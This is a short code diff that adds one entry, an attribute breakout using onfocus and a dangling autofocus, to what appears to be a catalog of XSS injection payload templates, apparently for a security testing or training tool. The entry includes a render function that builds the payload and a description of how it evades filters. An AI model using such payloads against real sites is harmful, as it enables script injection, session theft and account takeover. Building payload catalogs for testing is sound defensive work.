@@ -198,6 +198,15 @@ export const XSS_INJECTION_TYPES: XssInjectionType[] = [
     render: (a, q) => `${q} autofocus onfocus=${q}${a}${q}`,
   },
   {
+    id: "intermediate-attr-breakout-onfocus-autofocus",
+    label: "Attribute breakout (onfocus + autofocus)",
+    level: "intermediate",
+    contexts: ["reflected-stored"],
+    slot: "attribute",
+    technique: "Closes the current attribute, adds onfocus, then a dangling autofocus= left open to swallow the page's own closing quote — fires without user interaction and dodges filters that only look for the 'autofocus onfocus' ordering",
+    render: (a, q) => `${q} onfocus=${q}${a}${q} autofocus=${q}`,
+  },
+  {
     id: "intermediate-nested-tag-split",
     label: "Nested tag split",
     level: "intermediate",
